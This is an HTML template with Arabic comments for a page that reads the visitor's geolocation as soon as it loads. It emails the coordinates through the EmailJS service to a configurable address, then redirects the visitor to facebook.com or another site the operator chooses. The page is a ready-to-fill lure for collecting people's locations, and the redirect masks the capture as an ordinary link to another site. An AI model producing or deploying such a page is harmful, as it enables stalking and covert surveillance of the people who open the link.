<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال الموقع وزيارة الموقع</title>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init("YOUR_USER_ID"); // استبدل بـ User ID الخاص بك من EmailJS
        })();

        function sendLocationAndRedirect() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendEmail);
            } else {
                alert("المتصفح لا يدعم خاصية تحديد الموقع.");
            }
        }

        function sendEmail(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            
            // تجهيز بيانات البريد الإلكتروني
            var templateParams = {
                to_email: 'recipient@example.com', // استبدل بالبريد الإلكتروني الذي سترسل إليه
                from_name: 'اسم الموقع', // يمكنك وضع أي اسم هنا
                message: 'موقع المستخدم: Latitude: ' + latitude + ', Longitude: ' + longitude
            };

            // إرسال البريد الإلكتروني عبر EmailJS
            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
                .then(function(response) {
                    console.log('تم الإرسال بنجاح!', response.status, response.text);
                    alert('تم إرسال الموقع بنجاح!');
                    // إعادة توجيه المستخدم إلى الموقع المستهدف بعد فترة قصيرة
                    setTimeout(function() {
                        window.location.href = "https://www.facebook.com"; // استبدل بالرابط الذي تريد توجيه المستخدم إليه
                    }, 2000); // انتظر 2 ثانية قبل إعادة التوجيه
                }, function(error) {
                    console.log('فشل الإرسال...', error);
                    alert('حدث خطأ أثناء إرسال الموقع.');
                });
        }

        // استدعاء الدالة عند تحميل الصفحة
        window.onload = sendLocationAndRedirect;
    </script>
</head>
<body>
    <h1>إرسال الموقع الجغرافي وزيارة الموقع</h1>
</body>
</html>
